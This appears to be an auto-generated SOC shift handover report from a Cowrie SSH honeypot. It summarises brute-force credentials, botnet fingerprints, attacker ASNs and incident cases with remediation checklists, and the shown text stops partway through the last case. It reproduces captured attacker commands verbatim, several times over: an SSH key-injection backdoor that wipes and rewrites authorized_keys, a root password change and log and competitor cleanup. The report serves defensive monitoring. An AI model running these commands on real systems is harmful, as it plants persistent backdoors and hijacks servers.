# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-16 |
| **Generated At** | 2026-05-16T15:00:41Z |
| **Shift Time** | 15:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **216** |
| Confirmed Threats | **202** |
| False Positives Filtered | **14** (6.5%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **9** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **202** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **10** |
| Unique Usernames | **2** |
| Unique Passwords | **10** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `ZTE@uss100` | 1 |
| `dreamer` | 1 |
| `yml` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `ZTE@uss100` | 1 |
| `root` | `dreamer` | 1 |
| `root` | `yml` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ZTE@uss100` | `14.103.110.123` | 2026-05-16T14:45:06 |
| `root` | `dreamer` | `179.62.216.38` | 2026-05-16T14:45:20 |
| `root` | `yml` | `179.62.216.38` | 2026-05-16T14:49:14 |
| `root` | `3245gs5662d34` | `179.62.216.38` | 2026-05-16T14:49:22 |
| `root` | `mining` | `179.62.216.38` | 2026-05-16T14:50:59 |
| `root` | `booty` | `179.62.216.38` | 2026-05-16T14:52:41 |
| `root` | `Test@123456` | `179.62.216.38` | 2026-05-16T14:54:33 |
| `root` | `bridge` | `179.62.216.38` | 2026-05-16T14:56:21 |
| `root` | `Unknown` | `179.62.216.38` | 2026-05-16T14:58:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **216** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 33 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 19 | 1 |
| `03a80b21afa8...` | Modern SSH client | 14 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 19 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 14 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:MjhwiojhYwFt"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.110.123`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `179.62.216.38`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **15** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS263822` | GRUPO EQUIS S.A. | 1 | HIGH |
| `AS23888` | National Telecommunication Corporation HQ, | 1 | HIGH |
| `AS812` | Rogers Communications Canada Inc. | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | LOW |
| `AS50010` | Omani Qatari Telecommunication Company SAOC | 1 | LOW |
| `AS13213` | THG HOSTING LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4a04ac2e23c4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.110[.]123` |
| **First Seen** | 2026-05-16 14:45 |
| **Last Seen** | 2026-05-16 14:45 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MjhwiojhYwFt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:45:06` | `cowrie.session.connect` |
| `2026-05-16 14:45:06` | `cowrie.client.version` |
| `2026-05-16 14:45:06` | `cowrie.client.kex` |
| `2026-05-16 14:45:06` | `cowrie.login.success` |
| `2026-05-16 14:45:07` | `cowrie.session.params` |
| `2026-05-16 14:45:07` | `cowrie.command.input` |
| `2026-05-16 14:45:07` | `cowrie.command.failed` |
| `2026-05-16 14:45:07` | `cowrie.log.closed` |
| `2026-05-16 14:45:07` | `cowrie.session.params` |
| `2026-05-16 14:45:07` | `cowrie.command.input` |
| `2026-05-16 14:45:07` | `cowrie.session.file_download` |
| `2026-05-16 14:45:07` | `cowrie.log.closed` |
| `2026-05-16 14:45:23` | `cowrie.session.params` |
| `2026-05-16 14:45:23` | `cowrie.command.input` |
| `2026-05-16 14:45:24` | `cowrie.log.closed` |
| `2026-05-16 14:45:24` | `cowrie.session.params` |
| `2026-05-16 14:45:24` | `cowrie.command.input` |
| `2026-05-16 14:45:24` | `cowrie.log.closed` |
| `2026-05-16 14:45:24` | `cowrie.session.params` |
| `2026-05-16 14:45:24` | `cowrie.command.input` |
| `2026-05-16 14:45:25` | `cowrie.session.file_download` |
| `2026-05-16 14:45:25` | `cowrie.log.closed` |
| `2026-05-16 14:45:25` | `cowrie.session.params` |
| `2026-05-16 14:45:25` | `cowrie.command.input` |
| `2026-05-16 14:45:25` | `cowrie.log.closed` |
| `2026-05-16 14:45:25` | `cowrie.session.params` |
| `2026-05-16 14:45:25` | `cowrie.command.input` |
| `2026-05-16 14:45:25` | `cowrie.log.closed` |
| `2026-05-16 14:45:26` | `cowrie.session.params` |
| `2026-05-16 14:45:26` | `cowrie.command.input` |
| `2026-05-16 14:45:26` | `cowrie.command.input` |
| `2026-05-16 14:45:26` | `cowrie.log.closed` |
| `2026-05-16 14:45:26` | `cowrie.session.params` |
| `2026-05-16 14:45:26` | `cowrie.command.input` |
| `2026-05-16 14:45:26` | `cowrie.log.closed` |
| `2026-05-16 14:45:27` | `cowrie.session.params` |
| `2026-05-16 14:45:27` | `cowrie.command.input` |
| `2026-05-16 14:45:27` | `cowrie.log.closed` |
| `2026-05-16 14:45:27` | `cowrie.session.params` |
| `2026-05-16 14:45:27` | `cowrie.command.input` |
| `2026-05-16 14:45:27` | `cowrie.log.closed` |
| `2026-05-16 14:45:27` | `cowrie.session.params` |
| `2026-05-16 14:45:27` | `cowrie.command.input` |
| `2026-05-16 14:45:28` | `cowrie.log.closed` |
| `2026-05-16 14:45:28` | `cowrie.session.params` |
| `2026-05-16 14:45:28` | `cowrie.command.input` |
| `2026-05-16 14:45:28` | `cowrie.log.closed` |
| `2026-05-16 14:45:28` | `cowrie.session.params` |
| `2026-05-16 14:45:28` | `cowrie.command.input` |
| `2026-05-16 14:45:28` | `cowrie.log.closed` |
| `2026-05-16 14:45:29` | `cowrie.session.params` |
| `2026-05-16 14:45:29` | `cowrie.command.input` |
| `2026-05-16 14:45:29` | `cowrie.log.closed` |
| `2026-05-16 14:45:29` | `cowrie.session.params` |
| `2026-05-16 14:45:29` | `cowrie.command.input` |
| `2026-05-16 14:45:29` | `cowrie.log.closed` |
| `2026-05-16 14:45:30` | `cowrie.session.params` |
| `2026-05-16 14:45:30` | `cowrie.command.input` |
| `2026-05-16 14:45:30` | `cowrie.log.closed` |
| `2026-05-16 14:45:30` | `cowrie.session.params` |
| `2026-05-16 14:45:30` | `cowrie.command.input` |
| `2026-05-16 14:45:30` | `cowrie.log.closed` |
| `2026-05-16 14:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.110[.]123` to AbuseIPDB if not already reported
- [ ] Block `14.103.110[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0212f6e0deac

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:45 |
| **Last Seen** | 2026-05-16 14:45 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:45:19` | `cowrie.session.connect` |
| `2026-05-16 14:45:19` | `cowrie.client.version` |
| `2026-05-16 14:45:19` | `cowrie.client.kex` |
| `2026-05-16 14:45:20` | `cowrie.login.success` |
| `2026-05-16 14:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f03452f5231

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:49 |
| **Last Seen** | 2026-05-16 14:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:49:12` | `cowrie.session.connect` |
| `2026-05-16 14:49:12` | `cowrie.client.version` |
| `2026-05-16 14:49:12` | `cowrie.client.kex` |
| `2026-05-16 14:49:14` | `cowrie.login.success` |
| `2026-05-16 14:49:14` | `cowrie.session.params` |
| `2026-05-16 14:49:14` | `cowrie.command.input` |
| `2026-05-16 14:49:14` | `cowrie.command.failed` |
| `2026-05-16 14:49:15` | `cowrie.log.closed` |
| `2026-05-16 14:49:16` | `cowrie.session.params` |
| `2026-05-16 14:49:16` | `cowrie.command.input` |
| `2026-05-16 14:49:16` | `cowrie.session.file_download` |
| `2026-05-16 14:49:16` | `cowrie.log.closed` |
| `2026-05-16 14:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29922b0d2709

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:49 |
| **Last Seen** | 2026-05-16 14:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:49:20` | `cowrie.session.connect` |
| `2026-05-16 14:49:20` | `cowrie.client.version` |
| `2026-05-16 14:49:20` | `cowrie.client.kex` |
| `2026-05-16 14:49:22` | `cowrie.login.success` |
| `2026-05-16 14:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc728b6e8e4

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:50 |
| **Last Seen** | 2026-05-16 14:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:50:58` | `cowrie.session.connect` |
| `2026-05-16 14:50:58` | `cowrie.client.version` |
| `2026-05-16 14:50:58` | `cowrie.client.kex` |
| `2026-05-16 14:50:59` | `cowrie.login.success` |
| `2026-05-16 14:51:00` | `cowrie.session.params` |
| `2026-05-16 14:51:00` | `cowrie.command.input` |
| `2026-05-16 14:51:00` | `cowrie.command.failed` |
| `2026-05-16 14:51:01` | `cowrie.log.closed` |
| `2026-05-16 14:51:01` | `cowrie.session.params` |
| `2026-05-16 14:51:01` | `cowrie.command.input` |
| `2026-05-16 14:51:02` | `cowrie.session.file_download` |
| `2026-05-16 14:51:02` | `cowrie.log.closed` |
| `2026-05-16 14:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3962f9a5d5f

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:51 |
| **Last Seen** | 2026-05-16 14:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:51:06` | `cowrie.session.connect` |
| `2026-05-16 14:51:06` | `cowrie.client.version` |
| `2026-05-16 14:51:06` | `cowrie.client.kex` |
| `2026-05-16 14:51:08` | `cowrie.login.success` |
| `2026-05-16 14:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac447b99941b

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:52 |
| **Last Seen** | 2026-05-16 14:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:52:39` | `cowrie.session.connect` |
| `2026-05-16 14:52:39` | `cowrie.client.version` |
| `2026-05-16 14:52:40` | `cowrie.client.kex` |
| `2026-05-16 14:52:41` | `cowrie.login.success` |
| `2026-05-16 14:52:42` | `cowrie.session.params` |
| `2026-05-16 14:52:42` | `cowrie.command.input` |
| `2026-05-16 14:52:42` | `cowrie.command.failed` |
| `2026-05-16 14:52:43` | `cowrie.log.closed` |
| `2026-05-16 14:52:43` | `cowrie.session.params` |
| `2026-05-16 14:52:43` | `cowrie.command.input` |
| `2026-05-16 14:52:43` | `cowrie.session.file_download` |
| `2026-05-16 14:52:43` | `cowrie.log.closed` |
| `2026-05-16 14:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21bacd9a4124

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:52 |
| **Last Seen** | 2026-05-16 14:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:52:47` | `cowrie.session.connect` |
| `2026-05-16 14:52:47` | `cowrie.client.version` |
| `2026-05-16 14:52:48` | `cowrie.client.kex` |
| `2026-05-16 14:52:49` | `cowrie.login.success` |
| `2026-05-16 14:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf9a2dd04d6

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:54 |
| **Last Seen** | 2026-05-16 14:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:54:32` | `cowrie.session.connect` |
| `2026-05-16 14:54:32` | `cowrie.client.version` |
| `2026-05-16 14:54:32` | `cowrie.client.kex` |
| `2026-05-16 14:54:33` | `cowrie.login.success` |
| `2026-05-16 14:54:34` | `cowrie.session.params` |
| `2026-05-16 14:54:34` | `cowrie.command.input` |
| `2026-05-16 14:54:34` | `cowrie.command.failed` |
| `2026-05-16 14:54:35` | `cowrie.log.closed` |
| `2026-05-16 14:54:35` | `cowrie.session.params` |
| `2026-05-16 14:54:35` | `cowrie.command.input` |
| `2026-05-16 14:54:36` | `cowrie.session.file_download` |
| `2026-05-16 14:54:36` | `cowrie.log.closed` |
| `2026-05-16 14:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72120e3ccf6e

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:54 |
| **Last Seen** | 2026-05-16 14:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:54:40` | `cowrie.session.connect` |
| `2026-05-16 14:54:40` | `cowrie.client.version` |
| `2026-05-16 14:54:40` | `cowrie.client.kex` |
| `2026-05-16 14:54:42` | `cowrie.login.success` |
| `2026-05-16 14:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d617a4c46e

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:56 |
| **Last Seen** | 2026-05-16 14:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:56:19` | `cowrie.session.connect` |
| `2026-05-16 14:56:19` | `cowrie.client.version` |
| `2026-05-16 14:56:20` | `cowrie.client.kex` |
| `2026-05-16 14:56:21` | `cowrie.login.success` |
| `2026-05-16 14:56:22` | `cowrie.session.params` |
| `2026-05-16 14:56:22` | `cowrie.command.input` |
